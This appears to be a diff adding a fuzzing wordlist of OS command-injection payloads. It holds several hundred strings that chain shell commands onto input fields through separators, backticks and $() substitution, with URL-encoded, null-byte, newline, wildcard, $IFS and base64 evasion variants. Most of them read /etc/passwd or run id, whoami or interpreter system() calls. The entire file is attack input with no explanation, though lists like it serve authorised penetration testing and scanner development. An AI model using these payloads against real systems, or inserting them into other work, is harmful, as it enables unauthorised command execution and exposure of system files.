@@ -1,0 +1,632 @@
+; ls
+; id
+; pwd
+; whoami
+; uname -a
+; cat /etc/passwd
+; ifconfig
+; ipconfig
+; netstat -an
+; ps aux
+; wget
+; curl
+; ping -c 4 127.0.0.1
+; sleep 5
+; echo vulnerable
+| ls
+| id
+| pwd
+| whoami
+| uname -a
+| cat /etc/passwd
+| ifconfig
+| ipconfig
+| netstat -an
+| ps aux
+| wget
+| curl
+| ping -c 4 127.0.0.1
+| sleep 5
+| echo vulnerable
+|| ls
+|| id
+|| pwd
+|| whoami
+|| uname -a
+|| cat /etc/passwd
+|| ifconfig
+|| ipconfig
+|| netstat -an
+|| ps aux
+|| wget
+|| curl
+|| ping -c 4 127.0.0.1
+|| sleep 5
+|| echo vulnerable
+& ls
+& id
+& pwd
+& whoami
+& uname -a
+& cat /etc/passwd
+& ifconfig
+& ipconfig
+& netstat -an
+& ps aux
+& wget
+& curl
+& ping -c 4 127.0.0.1
+& sleep 5
+& echo vulnerable
+&& ls
+&& id
+&& pwd
+&& whoami
+&& uname -a
+&& cat /etc/passwd
+&& ifconfig
+&& ipconfig
+&& netstat -an
+&& ps aux
+&& wget
+&& curl
+&& ping -c 4 127.0.0.1
+&& sleep 5
+&& echo vulnerable
+` ls `
+` id `
+` pwd `
+` whoami `
+` uname -a `
+` cat /etc/passwd `
+` ifconfig `
+` ipconfig `
+` netstat -an `
+` ps aux `
+` wget `
+` curl `
+` ping -c 4 127.0.0.1 `
+` sleep 5 `
+` echo vulnerable `
+$( ls )
+$( id )
+$( pwd )
+$( whoami )
+$( uname -a )
+$( cat /etc/passwd )
+$( ifconfig )
+$( ipconfig )
+$( netstat -an )
+$( ps aux )
+$( wget )
+$( curl )
+$( ping -c 4 127.0.0.1 )
+$( sleep 5 )
+$( echo vulnerable )
+
+; cat /etc/passwd
+;cat /etc/passwd
+;  cat /etc/passwd
+;   cat /etc/passwd
+;    cat /etc/passwd
+| cat /etc/passwd
+|cat /etc/passwd
+|  cat /etc/passwd
+|   cat /etc/passwd
+|    cat /etc/passwd
+|| cat /etc/passwd
+||cat /etc/passwd
+||  cat /etc/passwd
+||   cat /etc/passwd
+||    cat /etc/passwd
+& cat /etc/passwd
+&cat /etc/passwd
+&  cat /etc/passwd
+&   cat /etc/passwd
+&    cat /etc/passwd
+&& cat /etc/passwd
+&&cat /etc/passwd
+&&  cat /etc/passwd
+&&   cat /etc/passwd
+&&    cat /etc/passwd
+%0a cat /etc/passwd
+%0d cat /etc/passwd
+%0a%0d cat /etc/passwd
+\n cat /etc/passwd
+\r cat /etc/passwd
+\r\n cat /etc/passwd
+; cat</etc/passwd
+| cat</etc/passwd
+; cat<>/etc/passwd
+| cat<>/etc/passwd
+; cat /e\tc/p\asswd
+| cat /e\tc/p\asswd
+; cat /etc/pass'w'd
+| cat /etc/pass'w'd
+; cat /etc/pass"w"d
+| cat /etc/pass"w"d
+; cat /etc/passw''d
+| cat /etc/passw''d
+; cat /etc/passw""d
+| cat /etc/passw""d
+; c'a't /etc/passwd
+| c'a't /etc/passwd
+; c"a"t /etc/passwd
+| c"a"t /etc/passwd
+; ca\t /etc/passwd
+| ca\t /etc/passwd
+; /bin/cat /etc/passwd
+| /bin/cat /etc/passwd
+; /usr/bin/cat /etc/passwd
+| /usr/bin/cat /etc/passwd
+; cat${IFS}/etc/passwd
+| cat${IFS}/etc/passwd
+; cat$IFS/etc/passwd
+| cat$IFS/etc/passwd
+; cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+| cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+; cat$IFS$9/etc/passwd
+| cat$IFS$9/etc/passwd
+; cat${IFS}${1}/etc/passwd
+| cat${IFS}${1}/etc/passwd
+; cat</etc/passwd;
+| cat</etc/passwd;
+; {cat,/etc/passwd}
+| {cat,/etc/passwd}
+; X=$'cat\x20/etc/passwd'&&$X
+| X=$'cat\x20/etc/passwd'&&$X
+; sh -c "cat /etc/passwd"
+| sh -c "cat /etc/passwd"
+; bash -c "cat /etc/passwd"
+| bash -c "cat /etc/passwd"
+; /bin/sh -c "cat /etc/passwd"
+| /bin/sh -c "cat /etc/passwd"
+; /bin/bash -c "cat /etc/passwd"
+| /bin/bash -c "cat /etc/passwd"
+; `cat /etc/passwd`
+| `cat /etc/passwd`
+; $(cat /etc/passwd)
+| $(cat /etc/passwd)
+; cat /etc/passwd #
+| cat /etc/passwd #
+; cat /etc/passwd;#
+| cat /etc/passwd;#
+; cat /etc/passwd //
+| cat /etc/passwd //
+; cat /etc/passwd;
+| cat /etc/passwd;
+; cat /etc/passwd|
+| cat /etc/passwd|
+; cat /etc/passwd||
+| cat /etc/passwd||
+; cat /etc/passwd&&
+| cat /etc/passwd&&
+; cat /etc/passwd&
+| cat /etc/passwd&
+%00; cat /etc/passwd
+%00| cat /etc/passwd
+%00|| cat /etc/passwd
+%00& cat /etc/passwd
+%00&& cat /etc/passwd
+; %00cat /etc/passwd
+| %00cat /etc/passwd
+; cat%00 /etc/passwd
+| cat%00 /etc/passwd
+; cat /etc/passwd%00
+| cat /etc/passwd%00
+;%20cat%20/etc/passwd
+|%20cat%20/etc/passwd
+;cat%20/etc/passwd
+|cat%20/etc/passwd
+%3bcat%20/etc/passwd
+%7ccat%20/etc/passwd
+; cat /etc/passwd%0a
+| cat /etc/passwd%0a
+; cat /etc/passwd%0d
+| cat /etc/passwd%0d
+; cat /etc/passwd\n
+| cat /etc/passwd\n
+; cat /etc/passwd\r
+| cat /etc/passwd\r
+;${IFS}cat${IFS}/etc/passwd
+|${IFS}cat${IFS}/etc/passwd
+;$IFS$9cat$IFS$9/etc/passwd
+|$IFS$9cat$IFS$9/etc/passwd
+; /???/??t /???/??ss??
+| /???/??t /???/??ss??
+; /???/c?t /???/p?ss??
+| /???/c?t /???/p?ss??
+; /b??/c?? /e??/p??s??
+| /b??/c?? /e??/p??s??
+; /b*/c* /e*/p*ss*
+| /b*/c* /e*/p*ss*
+; cat /e*c/p*ss*d
+| cat /e*c/p*ss*d
+; cat /*tc/p*sswd
+| cat /*tc/p*sswd
+; cat /*/*/passwd
+| cat /*/*/passwd
+; cat /*/*/*wd
+| cat /*/*/*wd
+%0acat%20/etc/passwd
+%0dcat%20/etc/passwd
+%0a%0dcat%20/etc/passwd
+\ncat /etc/passwd
+\rcat /etc/passwd
+\r\ncat /etc/passwd
+; cat</dev/null</etc/passwd
+| cat</dev/null</etc/passwd
+; (cat /etc/passwd)
+| (cat /etc/passwd)
+; { cat /etc/passwd; }
+| { cat /etc/passwd; }
+; [cat /etc/passwd]
+| [cat /etc/passwd]
+; cat /etc/passwd || id
+| cat /etc/passwd || id
+; cat /etc/passwd && id
+| cat /etc/passwd && id
+; cat /etc/passwd | id
+| cat /etc/passwd | id
+; cat /etc/passwd ; id
+| cat /etc/passwd ; id
+; cat /etc/passwd & id
+| cat /etc/passwd & id
+; a=c;b=at;$a$b /etc/passwd
+| a=c;b=at;$a$b /etc/passwd
+; echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | sh
+| echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | sh
+; perl -e 'system("cat /etc/passwd")'
+| perl -e 'system("cat /etc/passwd")'
+; python -c 'import os;os.system("cat /etc/passwd")'
+| python -c 'import os;os.system("cat /etc/passwd")'
+; ruby -e 'system("cat /etc/passwd")'
+| ruby -e 'system("cat /etc/passwd")'
+; php -r 'system("cat /etc/passwd");'
+| php -r 'system("cat /etc/passwd");'
+; awk 'BEGIN {system("cat /etc/passwd")}'
+| awk 'BEGIN {system("cat /etc/passwd")}'
+; cat$u /etc/passwd
+| cat$u /etc/passwd
+; cat$@ /etc/passwd
+| cat$@ /etc/passwd
+; cat$* /etc/passwd
+| cat$* /etc/passwd
+; cat${x} /etc/passwd
+| cat${x} /etc/passwd
+; cat${u} /etc/passwd
+| cat${u} /etc/passwd
+; cat${@} /etc/passwd
+| cat${@} /etc/passwd
+; cat${*} /etc/passwd
+| cat${*} /etc/passwd
+; c$@a$@t$@ /etc/passwd
+| c$@a$@t$@ /etc/passwd
+; ca$()t /etc/passwd
+| ca$()t /etc/passwd
+; ca${}t /etc/passwd
+| ca${}t /etc/passwd
+
+; %6c%73
+; %69%64
+; %70%77%64
+; %77%68%6f%61%6d%69
+| %6c%73
+| %69%64
+| %70%77%64
+| %77%68%6f%61%6d%69
+|| %6c%73
+|| %69%64
+|| %70%77%64
+|| %77%68%6f%61%6d%69
+& %6c%73
+& %69%64
+& %70%77%64
+& %77%68%6f%61%6d%69
+&& %6c%73
+&& %69%64
+&& %70%77%64
+&& %77%68%6f%61%6d%69
+%3b ls
+%3b id
+%3b pwd
+%3b whoami
+%7c ls
+%7c id
+%7c pwd
+%7c whoami
+%7c%7c ls
+%7c%7c id
+%7c%7c pwd
+%7c%7c whoami
+%26 ls
+%26 id
+%26 pwd
+%26 whoami
+%26%26 ls
+%26%26 id
+%26%26 pwd
+%26%26 whoami
+%3b%20ls
+%3b%20id
+%3b%20pwd
+%3b%20whoami
+%7c%20ls
+%7c%20id
+%7c%20pwd
+%7c%20whoami
+%26%20ls
+%26%20id
+%26%20pwd
+%26%20whoami
+%0a ls
+%0a id
+%0a pwd
+%0a whoami
+%0d ls
+%0d id
+%0d pwd
+%0d whoami
+%0a%0d ls
+%0a%0d id
+%0a%0d pwd
+%0a%0d whoami
+\n ls
+\n id
+\n pwd
+\n whoami
+\r ls
+\r id
+\r pwd
+\r whoami
+\r\n ls
+\r\n id
+\r\n pwd
+\r\n whoami
+%0als
+%0aid
+%0apwd
+%0awhoami
+%0dls
+%0did
+%0dpwd
+%0dwhoami
+; c\at /etc/passwd
+; c\at /e\tc/p\asswd
+| c\at /etc/passwd
+| c\at /e\tc/p\asswd
+; cat</etc/passwd
+| cat</etc/passwd
+; cat${IFS}/etc/passwd
+| cat${IFS}/etc/passwd
+; cat$IFS/etc/passwd
+| cat$IFS/etc/passwd
+; cat /etc/pa\sswd
+| cat /etc/pa\sswd
+%3bcat%20/etc/passwd
+%7ccat%20/etc/passwd
+%26cat%20/etc/passwd
+
+; whoami; echo 'test'
+| whoami | echo 'test'
+|| whoami || echo 'test'
+& whoami & echo 'test'
+&& whoami && echo 'test'
+`whoami` && echo 'test'
+$(whoami) && echo 'test'
+test; whoami; test
+test | whoami | test
+test || whoami || test
+test & whoami & test
+test && whoami && test
+test `whoami` test
+test $(whoami) test
+'; whoami; '
+"; whoami; "
+'| whoami |'
+"| whoami |"
+'|| whoami ||'
+"|| whoami ||"
+'& whoami &'
+"& whoami &"
+'&& whoami &&'
+"&& whoami &&"
+'`whoami`'
+"`whoami`"
+'$(whoami)'
+"$(whoami)"
+') ; whoami ; ('
+") ; whoami ; ("
+') | whoami | ('
+") | whoami | ("
+') || whoami || ('
+") || whoami || ("
+') && whoami && ('
+") && whoami && ("
+'; whoami; echo '
+"; whoami; echo "
+'|| whoami || echo '
+"|| whoami || echo "
+1; whoami
+1| whoami
+1|| whoami
+1& whoami
+1&& whoami
+1`whoami`
+1$(whoami)
+a; whoami
+a| whoami
+a|| whoami
+a& whoami
+a&& whoami
+a`whoami`
+a$(whoami)
+-1; whoami
+-1| whoami
+-1|| whoami
+-1& whoami
+-1&& whoami
+-1`whoami`
+-1$(whoami)
+'; whoami; #
+"; whoami; #
+'| whoami | #
+"| whoami | #
+'|| whoami || #
+"|| whoami || #
+'& whoami & #
+"& whoami & #
+'&& whoami && #
+"&& whoami && #
+'`whoami`#
+"`whoami`#
+'$(whoami)#
+"$(whoami)#
+%0a; whoami
+%0a| whoami
+%0a|| whoami
+%0a& whoami
+%0a&& whoami
+%0a`whoami`
+%0a$(whoami)
+%0d; whoami
+%0d| whoami
+%0d|| whoami
+%0d& whoami
+%0d&& whoami
+%0d`whoami`
+%0d$(whoami)
+%0a%0d; whoami
+%0a%0d| whoami
+%0a%0d|| whoami
+%0a%0d& whoami
+%0a%0d&& whoami
+%0a%0d`whoami`
+%0a%0d$(whoami)
+'; whoami; --
+"; whoami; --
+'| whoami | --
+"| whoami | --
+'; whoami; /*
+"; whoami; /*
+'| whoami | /*
+"| whoami | /*
+*/; whoami; /*
+*/| whoami | /*
+*/|| whoami || /*
+*/& whoami & /*
+*/&& whoami && /*
+'; whoami; //
+"; whoami; //
+'| whoami | //
+"| whoami | //
+x'; whoami; '
+x"; whoami; "
+x'| whoami |'
+x"| whoami |"
+x'|| whoami ||'
+x"|| whoami ||"
+'; whoami || '
+"; whoami || "
+'; whoami && '
+"; whoami && "
+`whoami` || echo 'test'
+$(whoami) || echo 'test'
+`whoami` && echo 'test'
+$(whoami) && echo 'test'
+$(whoami)$(echo)
+`whoami``echo`
+'; $(whoami); '
+"; $(whoami); "
+'; `whoami`; '
+"; `whoami`; "
+'$(whoami)'
+"`whoami`"
+test'); whoami; ('test
+test"); whoami; ("test
+test'| whoami |'test
+test"| whoami |"test
+)); whoami; ((
+")); whoami; (("
+')); whoami; (('
+]; whoami; [
+"]; whoami; ["
+']; whoami; ['
+}; whoami; {
+"}; whoami; {"
+'}; whoami; {'
+>; whoami
+<; whoami
+>>; whoami
+<<; whoami
+<>; whoami
+>| whoami
+<| whoami
+>>| whoami
+<<| whoami
+<>| whoami
+test'; whoami; echo 'test
+test"; whoami; echo "test
+'; whoami; exit; '
+"; whoami; exit; "
+'|| whoami || exit ||'
+"|| whoami || exit ||"
+${IFS}whoami
+$IFS$9whoami
+{whoami}
+[whoami]
+(whoami)
+((whoami))
+$'whoami'
+$"whoami"
+'; whoami${IFS}; '
+"; whoami${IFS}; "
+'; who$()ami; '
+"; who$()ami; "
+'; who${x}ami; '
+"; who${x}ami; "
+'; who'am'i; '
+"; who"am"i; "
+'\nwhoami\n'
+"\nwhoami\n"
+'\rwhoami\r'
+"\rwhoami\r"
+'; \nwhoami\n; '
+"; \nwhoami\n; "
+%00; whoami
+%00| whoami
+%00|| whoami
+%00& whoami
+%00&& whoami
+'; whoami%00
+"; whoami%00
+'| whoami%00
+"| whoami%00
+```; whoami; ```
+"""; whoami; """
+'''; whoami; '''
+===; whoami; ===
+---; whoami; ---
+___; whoami; ___
+***; whoami; ***
++++; whoami; +++
+~~~; whoami; ~~~
+@@@; whoami; @@@
+$$$; whoami; $$$
+%%%; whoami; %%%
+^^^; whoami; ^^^
+&&&; whoami; &&&
+|||; whoami; |||
+test' OR '1'='1'; whoami; --
+test" OR "1"="1"; whoami; --
+test' AND '1'='1'; whoami; --
+test" AND "1"="1"; whoami; --
+<script>; whoami; </script>
+<img>; whoami; </img>
+<?php ; whoami; ?>
+<% ; whoami; %>
+{{ ; whoami; }}
+{% ; whoami; %}
+${ ; whoami; }
+#{ ; whoami; }
+@{ ; whoami; }
